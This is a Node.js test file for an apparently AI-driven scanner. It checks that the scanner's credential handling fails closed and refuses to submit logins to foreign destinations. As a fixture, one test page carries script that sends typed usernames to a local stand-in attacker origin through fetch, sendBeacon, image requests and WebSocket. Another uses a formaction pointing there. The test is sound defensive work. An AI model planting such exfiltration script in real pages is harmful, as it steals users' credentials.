/** Focused fail-closed boundaries for normal Flow prepared credentials. */
import test from 'node:test';
import assert from 'node:assert/strict';
import {createServer} from 'node:http';
import {once} from 'node:events';
import {SqliteProvider} from '../../server/src/db/sqlite-provider.ts';
import {dbManager} from '../../server/src/db/db-manager.ts';
import {AIScanRepository} from '../../server/src/services/ai-scan/repository.ts';
import {newBusinessFlow,saveBusinessFlow} from '../../server/src/services/ai-scan/agent-business-contract.ts';
import {closePersistentBrowserContextsForScan} from '../../server/src/services/ai-scan/browser/persistent-browser-runtime.ts';
import {createAgentToolRegistry} from '../../server/src/agent/index.ts';

async function listen(server) {
  server.listen(0, '127.0.0.1');
  await once(server, 'listening');
  return `http://127.0.0.1:${server.address().port}`;
}

async function close(server) {
  server.closeAllConnections?.();
  await new Promise(resolve => server.close(resolve));
}

async function normalFlow(repo, run, role = 'victim') {
  const task=await repo.createTask({scan_run_id:run.id,title:`Bound ${role} login`,task_type:'learn_business_flow',
    execution_plan:{intent:'learn_business_flow',flow_id:'pending'}});
  const flow=newBusinessFlow({name:`${role} sign in`,goal:'The supplied account signs in through one observed form.',role,start_state:'signed out'},task.id);
  await saveBusinessFlow(repo,run.id,task.id,flow);
  await repo.updateTask(task.id,{execution_plan:{intent:'learn_business_flow',flow_id:flow.id,identity_key:role}});
  return {task,flow,context:{repo,scanRunId:run.id,taskId:task.id}};
}

async function boundAccount(db, run, role, fields, suffix) {
  return db.repos.accounts.create({name:`${role} ${suffix}`,username:fields.username,status:'active',
    tags:['ai_scan',`scan:${run.id}`,`role:${role}`],fields,variables:{},auth_profile:{}});
}

test('prepared normal capture rejects duplicate roles and never falls back from an unusable bound account',async t=>{
  const db=new SqliteProvider('prepared-identity-binding-boundary',{file:':memory:'});
  await db.connect();await db.migrate();
  t.after(async()=>{await db.disconnect();});
  const repo=new AIScanRepository(db),registry=createAgentToolRegistry();
  const fallback={username:'configured-only-user',password:'configured-only-password'};
  const run=await repo.createRun({base_url:'http://127.0.0.1:38081/',scan_config:{account_mode:'manual',accounts:{victim:fallback}}});
  const duplicate=await normalFlow(repo,run);
  const usable=await boundAccount(db,run,'victim',{username:'bound-user',password:'bound-password'},'usable');
  await boundAccount(db,run,'victim',{username:'token-only-user',auth_token:'private-token'},'token-only');
  const ambiguous=await registry.call('bstg.business.capture.start',{flow_id:duplicate.flow.id,account_id:usable.id},{db,...duplicate.context});
  assert.equal(ambiguous.ok,false);
  assert.match(ambiguous.error||'',/2 active scan-bound accounts|duplicate role binding/i);
  assert.equal((await db.repos.recordingSessions.findAll()).length,0,'an ambiguous role must not create a recording with a guessed account');

  const missingRun=await repo.createRun({base_url:'http://127.0.0.1:38082/',scan_config:{account_mode:'manual',accounts:{victim:fallback}}});
  const missing=await normalFlow(repo,missingRun);
  await boundAccount(db,missingRun,'victim',{username:'bound-without-password'},'incomplete');
  const unavailable=await registry.call('bstg.business.capture.start',{flow_id:missing.flow.id},{db,...missing.context});
  assert.equal(unavailable.ok,false);
  assert.match(unavailable.error||'',/no usable username\/password|fallback is disabled/i);
  assert.equal((await db.repos.recordingSessions.findAll()).length,0,'scan_config credentials cannot silently replace the persisted account binding');
});

test('prepared credential window rejects external form destinations and blocks fetch, beacon, image and WebSocket exfiltration', {timeout:120000}, async t=>{
  const attacks=[];
  const attacker=createServer((req,res)=>{
    attacks.push({kind:'http',url:req.url});req.resume();res.statusCode=204;res.end();
  });
  attacker.on('upgrade',(req,socket)=>{attacks.push({kind:'websocket',url:req.url});socket.destroy();});
  const attackerOrigin=await listen(attacker);
  const attackerSocket=attackerOrigin.replace(/^http:/,'ws:');
  let loginPosts=0;
  const target=createServer((req,res)=>{
    const url=new URL(req.url||'/', 'http://target.invalid');
    if(url.pathname==='/formaction'){
      res.setHeader('content-type','text/html; charset=utf-8');
      res.end(`<!doctype html><form method="post" action="/login"><input name="username" autocomplete="username"><input name="password" type="password"><button type="submit" formaction="${attackerOrigin}/form">Sign in</button></form>`);
      return;
    }
    if(url.pathname==='/guard'){
      res.setHeader('content-type','text/html; charset=utf-8');
      res.end(`<!doctype html><form id="login" method="post" action="/login"><input name="username" autocomplete="username"><input name="password" type="password"><button type="submit">Sign in</button></form><script>
        const external=${JSON.stringify(attackerOrigin)};const socket=${JSON.stringify(attackerSocket)};
        document.querySelector('[name=username]').addEventListener('input',event=>{
          fetch(external+'/fetch',{method:'POST',body:event.target.value}).catch(()=>{});
          navigator.sendBeacon(external+'/beacon',event.target.value);
          const image=new Image();image.src=external+'/image?value='+encodeURIComponent(event.target.value);
          try{new WebSocket(socket+'/socket');}catch{}
          setTimeout(()=>fetch(external+'/delayed',{method:'POST',body:'later'}).catch(()=>{}),50);
        });
      </script>`);
      return;
    }
    if(url.pathname==='/login'&&req.method==='POST'){loginPosts++;req.resume();res.statusCode=204;res.end();return;}
    res.statusCode=404;res.end();
  });
  const targetOrigin=await listen(target);
  const db=new SqliteProvider('prepared-identity-network-boundary',{file:':memory:'});
  let priorActive,activeReplaced=false,priorBrowserMode,browserModeReplaced=false,repo,run;
  const runs=[];
  const cleanup=async()=>{
    if(repo)await Promise.allSettled(runs.map(item=>closePersistentBrowserContextsForScan(repo,item.id)));
    if(activeReplaced)dbManager.getActive=priorActive;
    if(browserModeReplaced){if(priorBrowserMode===undefined)delete process.env.BSTG_BROWSER_MODE;else process.env.BSTG_BROWSER_MODE=priorBrowserMode;}
    await Promise.allSettled([db.disconnect(),close(target),close(attacker)]);
  };
  t.after(cleanup);
  await db.connect();await db.migrate();
  priorActive=dbManager.getActive;dbManager.getActive=()=>db;activeReplaced=true;
  priorBrowserMode=process.env.BSTG_BROWSER_MODE;process.env.BSTG_BROWSER_MODE='headless';browserModeReplaced=true;
  repo=new AIScanRepository(db);const registry=createAgentToolRegistry();

  const formRun=await repo.createRun({base_url:targetOrigin+'/',scan_config:{account_mode:'manual'}});runs.push(formRun);
  const formFlow=await normalFlow(repo,formRun);
  await boundAccount(db,formRun,'victim',{username:'bound-user',password:'bound-password'},'formaction');
  const formCapture=await registry.call('bstg.business.capture.start',{flow_id:formFlow.flow.id},{db,...formFlow.context});
  assert.equal(formCapture.ok,true,JSON.stringify(formCapture));
  assert.equal((await registry.call('browser.navigate',{url:targetOrigin+'/formaction',context_scope:'task',identity_key:'victim',context_key:formCapture.data.context_key},{db,...formFlow.context})).ok,true);
  const rejectedForm=await registry.call('bstg.identity.apply_login',{flow_id:formFlow.flow.id},{db,...formFlow.context});
  assert.equal(rejectedForm.ok,true,JSON.stringify(rejectedForm));
  assert.equal(rejectedForm.data.status,'credential_destination_not_allowed');
  assert.equal(rejectedForm.data.login_submitted,false);

  run=await repo.createRun({base_url:targetOrigin+'/',scan_config:{account_mode:'manual'}});runs.push(run);
  const guardedFlow=await normalFlow(repo,run);
  await boundAccount(db,run,'victim',{username:'bound-user',password:'bound-password'},'network');
  const capture=await registry.call('bstg.business.capture.start',{flow_id:guardedFlow.flow.id},{db,...guardedFlow.context});
  assert.equal(capture.ok,true,JSON.stringify(capture));
  assert.equal((await registry.call('browser.navigate',{url:targetOrigin+'/guard',context_scope:'task',identity_key:'victim',context_key:capture.data.context_key},{db,...guardedFlow.context})).ok,true);
  const rejectedNetwork=await registry.call('bstg.identity.apply_login',{flow_id:guardedFlow.flow.id},{db,...guardedFlow.context});
  assert.equal(rejectedNetwork.ok,true,JSON.stringify(rejectedNetwork));
  assert.equal(rejectedNetwork.data.status,'credential_network_blocked');
  assert.equal(rejectedNetwork.data.login_submitted,false);
  await new Promise(resolve=>setTimeout(resolve,250));
  assert.equal(loginPosts,0,'a blocked credential window must not submit the normal form');
  assert.deepEqual(attacks,[],'all external credential-window resource types stay inside the browser and never reach the remote origin');
});
